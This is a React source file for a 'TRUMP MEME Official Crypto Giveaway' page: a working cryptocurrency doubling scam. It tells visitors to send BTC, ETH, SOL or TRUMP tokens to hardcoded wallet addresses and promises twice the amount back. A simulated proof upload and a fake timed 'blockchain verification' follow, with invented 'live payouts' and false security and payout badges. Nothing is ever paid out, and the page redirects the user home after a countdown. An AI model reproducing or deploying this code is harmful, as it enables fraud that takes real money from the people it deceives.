import React, { useState, useEffect, useRef } from 'react';
import { getSiteSettings } from '@/lib/storage';
import { Copy, Check, Upload, AlertTriangle, ArrowLeft, Loader2 } from 'lucide-react';
import { AnimatePresence, motion } from 'framer-motion';
import { Button } from '@/components/ui/button';
import { toast } from 'sonner';
import { createPageUrl } from '@/utils';

const TRUMP_LOGO = "https://qtrypzzcjebvfcihiynt.supabase.co/storage/v1/object/public/base44-prod/public/69a8eb41a50eea87ead000ff/3b869c91c_images16.jpeg";

const BTC_LOGO = "https://upload.wikimedia.org/wikipedia/commons/thumb/4/46/Bitcoin.svg/1200px-Bitcoin.svg.png";
const ETH_LOGO = "https://upload.wikimedia.org/wikipedia/commons/thumb/0/05/Ethereum_logo_2014.svg/628px-Ethereum_logo_2014.svg.png";
const SOL_LOGO = "https://upload.wikimedia.org/wikipedia/en/b/b9/Solana_logo.png";

const defaultWallets = [
  { name: "Bitcoin", symbol: "BTC", address: "bc1qxy2kgdygjrsqtzq2n0yrf2493p83kkfjhx0wlh", min: "0.1 BTC", max: "20 BTC", logo: BTC_LOGO },
  { name: "Ethereum", symbol: "ETH", address: "0x742d35Cc6634C0532925a3b844Bc454e4438f44e", min: "1 ETH", max: "500 ETH", logo: ETH_LOGO },
  { name: "Solana", symbol: "SOL", address: "6p6xgHyF7AeE6TZkSmFsko444wqoP15icUSqi2jfGiPN", min: "10 SOL", max: "10,000 SOL", logo: SOL_LOGO },
  { name: "TRUMP Token", symbol: "TRUMP", address: "TXZQuyCasxN42bjAcYpP2xwYVMCF6gHBnv", min: "100 TRUMP", max: "100,000 TRUMP", logo: TRUMP_LOGO },
];

const STEPS = {
  LOADING_INTRO: 'loading_intro',
  WALLET: 'wallet',
  PROOF: 'proof',
  EXPLORER: 'explorer',
  SUCCESS: 'success',
};

const EXPLORER_MESSAGES = [
  "Connecting to blockchain network...",
  "Verifying transaction hash...",
  "Scanning mempool for payment...",
  "Confirming block headers...",
  "Cross-checking wallet signature...",
  "Payment detected on chain...",
  "Processing double return...",
];

export default function Participate() {
  const [step, setStep] = useState(STEPS.LOADING_INTRO);
  const [walletIndex, setWalletIndex] = useState(0);
  const [wallets, setWallets] = useState(defaultWallets);
  const [siteName, setSiteName] = useState("TRUMP MEME");
  const [logoUrl, setLogoUrl] = useState(TRUMP_LOGO);
  const [copied, setCopied] = useState(false);
  const [proofFile, setProofFile] = useState<File | null>(null);
  const [proofPreview, setProofPreview] = useState<string | null>(null);
  const [uploading, setUploading] = useState(false);
  const [introProgress, setIntroProgress] = useState(0);
  const [explorerProgress, setExplorerProgress] = useState(0);
  const [explorerMsg, setExplorerMsg] = useState(EXPLORER_MESSAGES[0]);
  const [successCountdown, setSuccessCountdown] = useState(20);
  const [payoutIndex, setPayoutIndex] = useState(0);
  const timerRef = useRef<any>(null);

  const PAYOUTS = [
    { addr: "bc1q...f4e2", amount: "0.5 BTC", payout: "1.0 BTC", time: "2 min ago" },
    { addr: "0x74...44e", amount: "3 ETH", payout: "6 ETH", time: "4 min ago" },
    { addr: "6p6x...iPn", amount: "50 SOL", payout: "100 SOL", time: "7 min ago" },
    { addr: "bc1q...9xk2", amount: "1.2 BTC", payout: "2.4 BTC", time: "9 min ago" },
    { addr: "0xA3...11f", amount: "5 ETH", payout: "10 ETH", time: "3 min ago" },
    { addr: "TXZq...bNv", amount: "500 TRUMP", payout: "1000 TRUMP", time: "6 min ago" },
    { addr: "6p6x...mQz", amount: "200 SOL", payout: "400 SOL", time: "1 min ago" },
    { addr: "bc1q...rr81", amount: "0.3 BTC", payout: "0.6 BTC", time: "5 min ago" },
  ];

  useEffect(() => {
    const params = new URLSearchParams(window.location.search);
    const idx = parseInt(params.get('wallet') || '0');
    setWalletIndex(idx);
  }, []);

  useEffect(() => {
    const stored = getSiteSettings();
    if (stored) {
      if (stored.site_name) setSiteName(stored.site_name);
      if (stored.logo_url) setLogoUrl(stored.logo_url);
      const count = parseInt(stored.wallet_count) || 4;
      const loaded = Array.from({ length: count }, (_, i) => ({
        name: stored[`wallet_${i + 1}_name`] || '',
        symbol: stored[`wallet_${i + 1}_symbol`] || '',
        address: stored[`wallet_${i + 1}_address`] || '',
        min: stored[`wallet_${i + 1}_min`] || '',
        max: stored[`wallet_${i + 1}_max`] || '',
        logo: stored[`wallet_${i + 1}_logo`] || TRUMP_LOGO,
      }));
      setWallets(loaded);
    }
  }, []);

  useEffect(() => {
    if (step !== STEPS.LOADING_INTRO) return;
    const duration = 15000;
    const interval = 100;
    let elapsed = 0;
    timerRef.current = setInterval(() => {
      elapsed += interval;
      setIntroProgress(Math.min((elapsed / duration) * 100, 100));
      if (elapsed >= duration) {
        clearInterval(timerRef.current);
        setStep(STEPS.WALLET);
      }
    }, interval);
    return () => clearInterval(timerRef.current);
  }, [step]);

  useEffect(() => {
    if (step !== STEPS.EXPLORER) return;
    const duration = 20000;
    const interval = 100;
    let elapsed = 0;
    let msgIndex = 0;
    timerRef.current = setInterval(() => {
      elapsed += interval;
      const pct = Math.min((elapsed / duration) * 100, 100);
      setExplorerProgress(pct);
      const newMsgIndex = Math.min(Math.floor((pct / 100) * EXPLORER_MESSAGES.length), EXPLORER_MESSAGES.length - 1);
      if (newMsgIndex !== msgIndex) {
        msgIndex = newMsgIndex;
        setExplorerMsg(EXPLORER_MESSAGES[msgIndex]);
      }
      if (elapsed >= duration) {
        clearInterval(timerRef.current);
        setStep(STEPS.SUCCESS);
      }
    }, interval);
    return () => clearInterval(timerRef.current);
  }, [step]);

  useEffect(() => {
    if (step !== STEPS.SUCCESS) return;
    const t = setInterval(() => {
      setPayoutIndex(prev => (prev + 1) % PAYOUTS.length);
    }, 2500);
    return () => clearInterval(t);
  }, [step]);

  useEffect(() => {
    if (step !== STEPS.SUCCESS) return;
    setSuccessCountdown(20);
    timerRef.current = setInterval(() => {
      setSuccessCountdown(prev => {
        if (prev <= 1) {
          clearInterval(timerRef.current);
          window.location.href = createPageUrl('Home');
          return 0;
        }
        return prev - 1;
      });
    }, 1000);
    return () => clearInterval(timerRef.current);
  }, [step]);

  const wallet = wallets[walletIndex] || { name: 'Bitcoin', symbol: 'BTC', address: '', min: '', max: '', logo: TRUMP_LOGO };

  const handleCopy = () => {
    navigator.clipboard.writeText(wallet.address);
    setCopied(true);
    toast.success("Address copied!");
    setTimeout(() => setCopied(false), 2000);
  };

  const handleFileChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const file = e.target.files?.[0];
    if (!file) return;
    setProofFile(file);
    setProofPreview(URL.createObjectURL(file));
  };

  const handleSubmit = () => {
    if (!proofFile) {
      toast.error("Please upload your payment proof first.");
      return;
    }
    setUploading(true);
    // Simulate upload delay then proceed
    setTimeout(() => {
      setStep(STEPS.EXPLORER);
      setUploading(false);
    }, 1500);
  };

  if (step === STEPS.LOADING_INTRO) {
    return (
      <div className="min-h-screen bg-gray-950 flex flex-col items-center justify-center">
        <div className="flex flex-col items-center gap-8 px-6 text-center">
          <div className="relative">
            <div className="w-32 h-32 rounded-full border-4 border-red-600 overflow-hidden shadow-2xl animate-pulse">
              <img src={logoUrl} alt={siteName} className="w-full h-full object-cover object-top" />
            </div>
            <div className="absolute -inset-3 rounded-full border-2 border-red-500/30 animate-ping" />
          </div>
          <div>
            <h1 className="text-4xl font-black text-white mb-2">{siteName}</h1>
            <p className="text-red-400 font-semibold text-lg">Official Crypto Giveaway</p>
          </div>
          <div className="w-72">
            <div className="h-2 bg-gray-800 rounded-full overflow-hidden">
              <div className="h-full bg-gradient-to-r from-red-600 to-red-400 rounded-full transition-all duration-100" style={{ width: `${introProgress}%` }} />
            </div>
            <p className="text-gray-500 text-sm mt-3">Initializing secure connection...</p>
          </div>
        </div>
      </div>
    );
  }

  if (step === STEPS.WALLET) {
    return (
      <div className="min-h-screen bg-gray-950 flex flex-col items-center justify-center px-4 py-10">
        <div className="w-full max-w-lg">
          <div className="flex items-center gap-3 mb-6">
            <a href={createPageUrl('Home')} className="text-gray-500 hover:text-white transition-colors">
              <ArrowLeft className="w-5 h-5" />
            </a>
            <img src={logoUrl} alt={siteName} className="w-8 h-8 rounded-full object-cover object-top border border-red-600" />
            <span className="text-white font-bold">{siteName} Giveaway</span>
          </div>
          <div className="bg-yellow-500/10 border border-yellow-500/40 rounded-2xl p-5 mb-6">
            <div className="flex items-start gap-3">
              <AlertTriangle className="w-5 h-5 text-yellow-400 shrink-0 mt-0.5" />
              <div>
                <p className="text-yellow-300 font-bold mb-2">⚠️ How This Works — Read Carefully</p>
                <ul className="text-yellow-200/80 text-sm space-y-1.5 list-disc list-inside">
                  <li>Send <strong>{wallet.min}</strong> to <strong>{wallet.max}</strong> of <strong>{wallet.symbol}</strong> to the address below.</li>
                  <li>You will receive <strong>2× your sent amount</strong> back within 5–10 minutes.</li>
                  <li>Each wallet address can only participate <strong>once</strong>.</li>
                  <li>After sending, upload your payment proof on the next screen.</li>
                  <li>Do NOT send from an exchange wallet — use a personal wallet you control.</li>
                </ul>
              </div>
            </div>
          </div>
          <div className="bg-gray-900 border border-gray-800 rounded-2xl p-6 mb-6">
            <div className="flex items-center gap-3 mb-5">
              {wallet.logo
                ? <img src={wallet.logo} alt={wallet.symbol} className="w-12 h-12 rounded-full object-contain bg-gray-800 border border-gray-700 p-1" />
                : <div className="w-12 h-12 rounded-full bg-gray-800 flex items-center justify-center text-white font-bold">{wallet.symbol?.slice(0, 2)}</div>
              }
              <div>
                <p className="text-white font-bold text-lg">{wallet.name}</p>
                <p className="text-gray-400 text-sm">{wallet.symbol} — Send & receive 2× back</p>
              </div>
            </div>
            <p className="text-gray-400 text-xs mb-2 uppercase tracking-wide font-semibold">Official Wallet Address</p>
            <div className="bg-gray-800 rounded-xl p-4 flex items-center gap-3 mb-4">
              <code className="text-green-400 text-sm break-all flex-1 font-mono">{wallet.address}</code>
              <button onClick={handleCopy} className="shrink-0 p-2 rounded-lg bg-gray-700 hover:bg-red-600 transition-colors">
                {copied ? <Check className="w-4 h-4 text-green-400" /> : <Copy className="w-4 h-4 text-white" />}
              </button>
            </div>
            <div className="flex gap-4 text-sm">
              <div className="flex-1 bg-gray-800 rounded-xl p-3 text-center">
                <p className="text-gray-500 text-xs">Min</p>
                <p className="text-white font-bold">{wallet.min}</p>
              </div>
              <div className="flex-1 bg-gray-800 rounded-xl p-3 text-center">
                <p className="text-gray-500 text-xs">Max</p>
                <p className="text-white font-bold">{wallet.max}</p>
              </div>
              <div className="flex-1 bg-red-900/50 rounded-xl p-3 text-center">
                <p className="text-red-400 text-xs">Return</p>
                <p className="text-red-300 font-bold">2×</p>
              </div>
            </div>
          </div>
          <Button onClick={() => setStep(STEPS.PROOF)} className="w-full bg-red-600 hover:bg-red-700 text-white py-5 text-base font-bold rounded-xl">
            I've Sent — Submit Payment Proof →
          </Button>
        </div>
      </div>
    );
  }

  if (step === STEPS.PROOF) {
    return (
      <div className="min-h-screen bg-gray-950 flex flex-col items-center justify-center px-4 py-10">
        <div className="w-full max-w-lg">
          <div className="flex items-center gap-3 mb-6">
            <button onClick={() => setStep(STEPS.WALLET)} className="text-gray-500 hover:text-white transition-colors">
              <ArrowLeft className="w-5 h-5" />
            </button>
            <img src={logoUrl} alt={siteName} className="w-8 h-8 rounded-full object-cover object-top border border-red-600" />
            <span className="text-white font-bold">Submit Payment Proof</span>
          </div>
          <div className="bg-gray-900 border border-gray-800 rounded-2xl p-6 mb-6">
            <p className="text-white font-bold text-lg mb-2">Upload Your Payment Screenshot</p>
            <p className="text-gray-400 text-sm mb-5">Take a screenshot of your transaction from your wallet app or blockchain explorer and upload it here to verify your payment.</p>
            <label className={`flex flex-col items-center justify-center w-full h-52 border-2 border-dashed rounded-xl cursor-pointer transition-colors ${proofFile ? 'border-green-500 bg-green-500/5' : 'border-gray-700 bg-gray-800 hover:border-red-500 hover:bg-red-500/5'}`}>
              {proofPreview ? (
                <img src={proofPreview} alt="proof" className="h-full w-full object-contain rounded-xl p-2" />
              ) : (
                <div className="flex flex-col items-center gap-3 text-center px-4">
                  <Upload className="w-10 h-10 text-gray-500" />
                  <p className="text-gray-400 font-semibold">Click to upload screenshot</p>
                  <p className="text-gray-600 text-xs">PNG, JPG, JPEG supported</p>
                </div>
              )}
              <input type="file" accept="image/*" className="hidden" onChange={handleFileChange} />
            </label>
            {proofFile && <p className="text-green-400 text-sm mt-3 text-center">✓ {proofFile.name} selected</p>}
          </div>
          <div className="bg-blue-500/10 border border-blue-500/30 rounded-xl p-4 mb-6">
            <p className="text-blue-300 text-sm">
              <strong>Sending to:</strong> <span className="font-mono text-blue-200 break-all">{wallet.address}</span>
            </p>
          </div>
          <Button onClick={handleSubmit} disabled={!proofFile || uploading} className="w-full bg-red-600 hover:bg-red-700 disabled:opacity-50 text-white py-5 text-base font-bold rounded-xl">
            {uploading ? (<><Loader2 className="w-5 h-5 mr-2 animate-spin" /> Uploading...</>) : ('Submit Payment Proof')}
          </Button>
        </div>
      </div>
    );
  }

  if (step === STEPS.EXPLORER) {
    return (
      <div className="min-h-screen bg-gray-950 flex flex-col items-center justify-center px-4">
        <div className="w-full max-w-md text-center">
          <div className="w-20 h-20 rounded-2xl bg-gray-900 border border-gray-800 flex items-center justify-center mx-auto mb-6">
            <Loader2 className="w-10 h-10 text-red-500 animate-spin" />
          </div>
          <h2 className="text-2xl font-black text-white mb-2">Blockchain Explorer</h2>
          <p className="text-gray-400 mb-8">Verifying your transaction on-chain...</p>
          <div className="bg-gray-900 border border-gray-800 rounded-2xl p-6 mb-6 text-left font-mono text-sm space-y-2">
            {EXPLORER_MESSAGES.map((msg, i) => {
              const reached = explorerProgress >= (i / EXPLORER_MESSAGES.length) * 100;
              return (
                <div key={i} className={`flex items-center gap-2 transition-opacity duration-500 ${reached ? 'opacity-100' : 'opacity-20'}`}>
                  <span className={reached ? 'text-green-400' : 'text-gray-600'}>{reached ? '✓' : '○'}</span>
                  <span className={reached ? 'text-green-300' : 'text-gray-600'}>{msg}</span>
                </div>
              );
            })}
          </div>
          <div className="w-full bg-gray-800 rounded-full h-3 overflow-hidden">
            <div className="h-full bg-gradient-to-r from-green-600 to-green-400 rounded-full transition-all duration-100" style={{ width: `${explorerProgress}%` }} />
          </div>
          <p className="text-gray-500 text-sm mt-3">{Math.round(explorerProgress)}% verified</p>
        </div>
      </div>
    );
  }

  if (step === STEPS.SUCCESS) {
    return (
      <div className="min-h-screen bg-gray-950 flex flex-col items-center justify-center px-4">
        <div className="w-full max-w-md text-center">
          <div className="w-28 h-28 rounded-full mx-auto mb-6 overflow-hidden border-4 border-green-500 shadow-2xl shadow-green-500/30">
            <img src={logoUrl} alt={siteName} className="w-full h-full object-cover object-top" />
          </div>
          <div className="text-6xl mb-4">⏳</div>
          <h2 className="text-3xl font-black text-white mb-3">Payment Pending</h2>
          <div className="bg-yellow-500/10 border border-yellow-500/30 rounded-2xl p-6 mb-6">
            <p className="text-yellow-300 text-lg font-bold mb-2">⏳ Awaiting Blockchain Confirmation</p>
            <p className="text-gray-300 text-base leading-relaxed">
              Once the blockchain has confirmed your payment, you will receive <strong className="text-yellow-400">2× your sent amount</strong> back to your wallet within <strong className="text-white">5 to 10 minutes</strong>.
            </p>
          </div>
          <div className="grid grid-cols-2 gap-3 mb-6">
            <div className="bg-gray-900 border border-gray-800 rounded-xl p-4 text-center">
              <div className="text-2xl mb-1">🔒</div>
              <p className="text-white font-bold text-sm">SSL Secured</p>
              <p className="text-gray-500 text-xs">256-bit encryption</p>
            </div>
            <div className="bg-gray-900 border border-gray-800 rounded-xl p-4 text-center">
              <div className="text-2xl mb-1">⛓️</div>
              <p className="text-white font-bold text-sm">On-Chain</p>
              <p className="text-gray-500 text-xs">Verified by blockchain</p>
            </div>
            <div className="bg-gray-900 border border-gray-800 rounded-xl p-4 text-center">
              <div className="text-2xl mb-1">⚡</div>
              <p className="text-white font-bold text-sm">Auto Payout</p>
              <p className="text-gray-500 text-xs">Smart contract powered</p>
            </div>
            <div className="bg-gray-900 border border-gray-800 rounded-xl p-4 text-center">
              <div className="text-2xl mb-1">✅</div>
              <p className="text-white font-bold text-sm">10,000+ Paid</p>
              <p className="text-gray-500 text-xs">Verified participants</p>
            </div>
          </div>
          <div className="bg-gray-900 border border-gray-800 rounded-xl p-4 mb-6 text-left overflow-hidden">
            <div className="flex items-center gap-2 mb-3">
              <span className="w-2 h-2 bg-green-500 rounded-full animate-pulse" />
              <p className="text-gray-400 text-xs uppercase tracking-wide font-semibold">Live Recent Payouts</p>
            </div>
            <div className="relative h-10">
              <AnimatePresence mode="wait">
                <motion.div
                  key={payoutIndex}
                  initial={{ opacity: 0, y: 16 }}
                  animate={{ opacity: 1, y: 0 }}
                  exit={{ opacity: 0, y: -16 }}
                  transition={{ duration: 0.4 }}
                  className="absolute inset-0 flex items-center justify-between text-xs"
                >
                  <span className="text-gray-500 font-mono">{PAYOUTS[payoutIndex].addr}</span>
                  <span className="text-gray-400">sent {PAYOUTS[payoutIndex].amount}</span>
                  <span className="text-green-400 font-bold">+{PAYOUTS[payoutIndex].payout}</span>
                  <span className="text-gray-600">{PAYOUTS[payoutIndex].time}</span>
                </motion.div>
              </AnimatePresence>
            </div>
          </div>
          <div className="bg-gray-900 border border-gray-800 rounded-xl p-4 mb-6">
            <p className="text-gray-500 text-sm">Returning to homepage in</p>
            <p className="text-4xl font-black text-red-500 mt-1">{successCountdown}s</p>
          </div>
          <a href={createPageUrl('Home')}>
            <Button className="w-full bg-red-600 hover:bg-red-700 text-white py-4 font-bold rounded-xl">
              Return to Homepage Now
            </Button>
          </a>
        </div>
      </div>
    );
  }

  return null;
}
